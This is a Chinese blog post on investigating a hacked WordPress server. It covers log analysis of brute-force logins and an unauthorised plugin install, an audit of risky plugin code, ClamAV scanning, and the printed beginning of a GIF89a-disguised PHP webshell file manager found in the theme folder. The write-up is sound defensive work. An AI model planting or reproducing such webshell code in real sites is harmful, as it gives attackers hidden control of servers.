---
title: 牧马人 — 基于 clamav 的服务器实时监控系统
url: https://h4ck.org.cn/2025/08/21364
source: obaby@mars
date: 2025-08-20
fetch_date: 2025-10-07T00:18:25.450219
---

# 牧马人 — 基于 clamav 的服务器实时监控系统

[![obaby@mars](/wp-content/uploads/2023/08/logo-pink-small.png)](https://h4ck.org.cn)

Artificial Intelligence / Reverse Engineering / Internet of Things / Full Stack Developer

* [※说说/Talk※](https://h4ck.org.cn/talk)
* [※留言/Msg※](https://h4ck.org.cn/guestbook)
* [※归档/File※](https://h4ck.org.cn/myarchive)
* [※资源/Res※](https://h4ck.org.cn/res-page)
* [※我是谁/Me※](https://h4ck.org.cn/whoami)
* [※集美们/Besties※](https://h4ck.org.cn/besties)

 [Menu](#mobilemenu)

* [※说说/Talk※](https://h4ck.org.cn/talk)
* [※留言/Msg※](https://h4ck.org.cn/guestbook)
* [※归档/File※](https://h4ck.org.cn/myarchive)
* [※资源/Res※](https://h4ck.org.cn/res-page)
* [※我是谁/Me※](https://h4ck.org.cn/whoami)
* [※集美们/Besties※](https://h4ck.org.cn/besties)

[病毒分析『Virus Analysis』](https://h4ck.org.cn/cats/crackasm/bdfx)

# 牧马人 — 基于 clamav 的服务器实时监控系统

2025年8月19日
[52 条评论](https://h4ck.org.cn/2025/08/21364#comments)

[![](https://h4ck.org.cn/wp-content/uploads/2025/08/kling_20250819_图生图_一位优雅专业的女骑手_2325_0-4.png)](https://h4ck.org.cn/wp-content/uploads/2025/08/kling_20250819_%E5%9B%BE%E7%94%9F%E5%9B%BE_%E4%B8%80%E4%BD%8D%E4%BC%98%E9%9B%85%E4%B8%93%E4%B8%9A%E7%9A%84%E5%A5%B3%E9%AA%91%E6%89%8B_2325_0-4.png)

对于服务器上出现的莫名奇妙的插件，虽然之前已经删除了，但是过几天就会再次出现一些奇奇怪怪的文件。周末的时候已经基于网站访问日志进行了系统的分析，通过分析得出了几个结论：

```
1.不断有人尝试通过 wp-login.php 进行登录
2.登录成功之后，尝试通过 wp 的 api 接口下载和激活插件
```

最后的结论是下面的样子：

```
根据访问日志分析，发现wp-file-manager插件被未授权安装。虽然您确认只有一个管理员账户且未进行安装操作，但日志显示插件确实被成功安装和激活。本报告分析了可能的原因和攻击路径。

关键发现
1. 攻击时间线分析
攻击IP地址
43.174.27.202 - 第一次安装 (2025年8月16日 08:02:14)
43.175.184.61 - 第一次激活 (2025年8月16日 08:02:18)
43.134.100.163 - 第二次安装和激活 (2025年8月17日 06:41:23)
攻击行为模式
暴力破解尝试：攻击IP多次尝试登录wp-login.php (403状态码)
成功登录：最终获得管理员权限
快速安装：登录后立即安装和激活插件
后续探测：安装后继续探测系统
2. 可能的攻击路径
路径1：管理员账户被破解
证据：

攻击IP多次尝试登录wp-login.php
最终成功访问wp-admin目录
能够执行插件安装操作
可能原因：

弱密码被暴力破解
密码泄露
会话劫持
社会工程学攻击
路径2：WordPress漏洞利用
证据：

攻击IP尝试访问可疑文件路径
多次探测wp-admin目录下的文件
使用自动化工具
可能的漏洞：

WordPress核心漏洞
插件漏洞
主题漏洞
文件上传漏洞
路径3：服务器层面入侵
证据：

攻击IP来自不同地理位置
使用自动化工具
系统级访问权限
可能原因：

服务器配置漏洞
数据库漏洞
文件系统权限问题
3. 日志分析证据
登录尝试记录
43.134.100.163 - - [08/Aug/2025:21:30:04 +0800] "POST /wp-login.php HTTP/1.1" 403 2545
43.134.100.163 - - [08/Aug/2025:21:30:05 +0800] "POST /wp-login.php HTTP/1.1" 403 2545
成功访问记录
43.134.100.163 - - [10/Aug/2025:00:42:46 +0800] "GET /wp-login.php?redirect_to=...&reauth=1 HTTP/1.1" 200 41129
43.134.100.163 - - [10/Aug/2025:00:42:49 +0800] "POST /wp-admin/admin-ajax.php?action=as_async_request_queue_runner&nonce=1bc2d4a2f7 HTTP/1.1" 200 31
恶意文件探测
43.134.100.163 - - [10/Aug/2025:00:43:15 +0800] "GET /wp-admin/js/baxa1.phP8/ HTTP/1.1" 200 116330
43.134.100.163 - - [10/Aug/2025:00:43:29 +0800] "GET /wp-admin/css/colors/blue/about.php7/ HTTP/1.1" 200 116503
4. 安全风险评估
高风险发现
管理员权限被获取：攻击者成功登录管理员账户
恶意插件安装：wp-file-manager可能被用作后门
文件系统访问：攻击者可能已获得文件系统访问权限
持续威胁：攻击者可能仍在系统中
中风险发现
自动化攻击：使用自动化工具进行攻击
多IP攻击：来自不同IP地址的攻击
文件探测：尝试访问可疑文件路径
5. 攻击者意图分析
wp-file-manager插件的作用
文件管理器：提供Web界面文件管理功能
后门工具：可能被用作持久化后门
权限提升：可能用于进一步权限提升
数据窃取：可能用于窃取敏感数据
攻击者行为特征
自动化操作：安装和激活间隔很短
来源伪装：显示来源为"www.google.com"
快速部署：立即安装和激活插件
持续监控：安装后继续探测系统
建议的应急响应措施
立即行动
隔离系统：立即断开服务器网络连接
备份数据：创建完整系统备份
检查文件：检查wp-file-manager插件文件
审计日志：详细分析所有访问日志
安全检查
密码重置：重置所有管理员账户密码
插件审查：检查所有已安装插件
文件完整性：检查核心文件完整性
数据库审计：检查数据库中的异常
长期措施
安全加固：实施更强的安全措施
监控系统：部署入侵检测系统
定期审计：定期进行安全审计
备份策略：实施完善的备份策略
结论
根据日志分析，wp-file-manager插件确实被未授权安装，这很可能是通过以下方式之一实现的：

管理员账户被破解：攻击者通过暴力破解或其他方式获得了管理员权限
WordPress漏洞利用：攻击者利用了WordPress或其插件的安全漏洞
服务器层面入侵：攻击者通过服务器层面的漏洞获得了访问权限
```

这就很有意思了，服务器在内网，公网没有可以登录的接口，那么其实我怀疑还有另外一种可能就是安装的插件本身有问题，因为毕竟好几个插件是破解版，还不是自己做的破解版。

```
本报告分析了目录下所有WordPress插件，查找可能存在的远程下载漏洞或能够下载文件的代码。分析涵盖了文件下载、远程文件获取、用户输入处理等安全相关功能。

发现的安全问题
1. 高风险漏洞
1.1 wp-douban插件 - 远程文件下载漏洞
文件位置：

wp-douban/src/functions.php (第548行)
wp-douban/src/subject-table.php (第167行)
wp-douban/src/subject-all-table.php (第166行)
问题描述： 该插件存在远程文件下载功能，直接从外部URL下载图片并保存到本地：

$imageData = curl_exec($ch);
file_put_contents($e, $imageData);
风险等级： 中风险 原因： 虽然URL来源相对可控（豆瓣API），但缺乏充分的URL验证和文件类型检查。

1.2 loginpress插件 - 远程文件下载功能
文件位置：

loginpress/classes/class-loginpress-ajax.php (第205行)
问题描述： 使用WordPress内置的download_url()函数下载远程文件：

$file['tmp_name'] = download_url( $value ); // Downloads a url to a local temporary file.
风险等级： 低风险 原因： 使用了WordPress的安全函数，但需要确保URL来源可信。

1.3 wp-opt插件 - 文件写入操作
文件位置：

wp-opt/core/Module.php (第54行、第61行)
问题描述： 将base64解码的数据写入文件：

file_put_contents($file_path, base64_decode($img_file));
风险等级： 中风险 原因： 缺乏对base64内容的验证，可能被恶意利用。

2. 中风险功能
2.1 envira-gallery插件 - 插件安装功能
文件位置：

envira-gallery/src/Functions/ajax.php (第774行、第815行)
问题描述： 允许通过URL安装插件：

$download_url = esc_url_raw( wp_unslash( $_POST['plugin'] ) );
$installer->install( $download_url );
风险等级： 中风险 原因： 虽然进行了URL清理，但仍需要确保下载源的可信度。

2.2 wp-mail-smtp-pro插件 - 文件下载功能
文件位置：

wp-mail-smtp-pro/src/Connect.php (第181行)
问题描述： 从用户提供的URL下载文件：

$post_url = ! empty( $_REQUEST['file'] ) ? esc_url_raw( wp_unslash( $_REQUEST['file'] ) ) : '';
$installer->install( $post_url );
风险等级： 中风险 原因： 虽然进行了URL清理和HMAC验证，但仍需谨慎处理。

3. 低风险功能
3.1 各种插件的API调用
涉及插件：

akismet
envira-videos
loginpress-pro
wordpress-seo
wp-mail-smtp-pro
问题描述： 使用wp_remote_get()、curl_exec()等函数进行远程API调用。

风险等级： 低风险 原因： 大多数调用都是向可信的API端点，且进行了适当的错误处理。

安全建议
1. 立即修复建议
wp-douban插件：

添加URL白名单验证
实现文件类型检查
限制下载文件大小
添加文件内容验证
wp-opt插件：

验证base64内容的合法性
添加文件类型检查
实现内容签名验证
2. 长期安全改进
所有插件：

实现统一的文件下载安全策略
添加文件类型白名单
实现文件大小限制
添加下载频率限制
用户输入验证：

对所有用户提供的URL进行严格验证
实现URL白名单机制
添加文件扩展名检查
文件系统安全：

限制文件写入目录
实现文件权限控制
添加文件完整性检查
```

鉴于上面的报告，继续删除了一些无用的插件。

然而，事情似乎并没有结束。在这之后，我又写了一个文件监控工具，来记录文件的创建和修改，但是效果并不是很好，无法追溯到执行下载的php 文件。

鉴于上面的问题，开始思考下一步操作，那就是直接进行文件杀毒，linux 的免费杀毒，选择也蛮多的，我用的 clamav。

<https://www.clamav.net>

ubuntu 安装也比较简单， 直接扫描网站目录：

[![](https://h4ck.org.cn/wp-content/uploads/2025/08/Jietu20250818-134104.jpg)](https://h4ck.org.cn/wp-content/uploads/2025/08/Jietu20250818-134104.jpg)

第一次扫描，得到了上面的结果，但是这个结果就很奇怪，感染文件 5 个，但是没有任何记录，

原来执行的扫描命令是：`clamscan -r /home >> /var/log/clamscan.log`

实际上，这个命令只是扫描了，但是感染文件不会被处理。

国内的文章，果然不能照着抄，还是得看官方文档：<https://docs.clamav.net>

实际上应该是：

```
clamscan --recursive=yes --infected --log=/home/wwwlogs/clams-scan.log --move=/home/infected /home/wwwroot/
```

这么个命令，这样扫描结果就一目了然了：

[![](https://h4ck.org.cn/wp-content/uploads/2025/08/Jietu20250818-1451233.jpg)](https://h4ck.org.cn/wp-content/uploads/2025/08/Jietu20250818-1451233.jpg)

这一堆乱七八糟的东西，竟然是主题：

[![](https://h4ck.org.cn/wp-content/uploads/2025/08/Jietu20250818-133936-2-scaled.jpg)](https://h4ck.org.cn/wp-content/uploads/2025/08/Jietu20250818-133936-2.jpg)

之前只关注了插件目录，没有看主题目录，现在看来，这个目录也是有问题的。

处理的文件：

[![](https://h4ck.org.cn/wp-content/uploads/2025/08/Jietu20250819-100721.jpg)](https://h4ck.org.cn/wp-content/uploads/2025/08/Jietu20250819-100721.jpg)

实际这个东西就是个文件管理器，代码如下：

```
GIF89a

<?php
/* GIF89a */

$home = $_SERVER['HOME'] ?? '/';
$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !is_dir($path)) $path = getcwd();
$uploadSuccess = false;
$fileLink = '';
$currentYear = date("Y");
$editContent = '';
$editTarget = '';
$message = '';

function h($str) { return htmlspecialchars($str, ENT_QUOTES); }

// Helper function to get full symbolic permissions
function getFullPermissions($file) {
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) { $info = 's'; }
    elseif (($perms & 0xA000) == 0xA000) { $info = 'l'; }
    elseif (($perms & 0x8000) == 0x8000) { $info = '-'; }
    elseif (($perms & 0x6000) == 0x6000) { $info = 'b'; }
    elseif (($perms & 0x4000) == 0x4000) { $info = 'd'; }
    elseif (($perms & 0x2000) == 0x2000) { $info = 'c'; }
    elseif (($perms & 0x1000) == 0x1000) { $info = 'p'; }
    else { $info = 'u'; }

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($per...